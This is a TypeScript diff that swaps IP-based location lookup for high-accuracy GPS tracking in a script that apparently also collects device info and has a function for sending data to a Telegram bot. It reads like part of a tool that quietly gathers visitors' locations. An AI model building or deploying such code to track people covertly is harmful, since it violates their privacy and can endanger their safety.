@@ -212,54 +212,36 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
   }
 }
 
+
 async function getLocationInfo(): Promise<LocationInfo> {
   try {
-    // Get IP-based location first as a fallback
-    const ipResponse = await fetch('https://ipapi.co/json/');
-    if (!ipResponse.ok) {
-      throw new Error(`Location API error: ${ipResponse.status}`);
+    if (!('geolocation' in navigator)) {
+      throw new Error('Geolocation not supported');
     }
-    const ipData = await ipResponse.json();
-    
-    const locationData: LocationInfo = {
-      city: ipData.city || 'Unknown',
-      country: ipData.country_name || 'Unknown',
-      latitude: ipData.latitude || null,
-      longitude: ipData.longitude || null,
-      accuracy: null,
-      source: 'IP',
-      ip: ipData.ip || 'Unknown'
+
+    const position = await new Promise<GeolocationPosition>((resolve, reject) => {
+      navigator.geolocation.watchPosition(
+        resolve,
+        reject,
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    });
+
+    return {
+      city: 'Unknown',        // Tidak bisa dapat dari GPS, hanya koordinat
+      country: 'Unknown',
+      latitude: position.coords.latitude,
+      longitude: position.coords.longitude,
+      accuracy: position.coords.accuracy,
+      source: 'GPS',
+      ip: 'Unknown'
     };
-
-    // Try to get precise location if available
-    if ('geolocation' in navigator) {
-      try {
-        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(
-            resolve,
-            reject,
-            {
-              enableHighAccuracy: true,
-              timeout: 5000,
-              maximumAge: 0
-            }
-          );
-        });
-
-        // Only update if we got more precise coordinates
-        locationData.latitude = position.coords.latitude;
-        locationData.longitude = position.coords.longitude;
-        locationData.accuracy = position.coords.accuracy;
-        locationData.source = 'GPS';
-      } catch (geoError) {
-        // Silently fall back to IP-based location
-        console.log('Using IP-based location as fallback');
-      }
-    }
-
-    return locationData;
   } catch (error) {
-    console.error('Error fetching location:', error);
+    console.error('Error fetching GPS location:', error);
     return {
       city: 'Unknown',
       country: 'Unknown',
@@ -271,6 +253,7 @@ async function getLocationInfo(): Promise<LocationInfo> {
     };
   }
 }
+
 
 
 async function sendTelegramMessage(botToken: string, data: any): Promise<Response> {
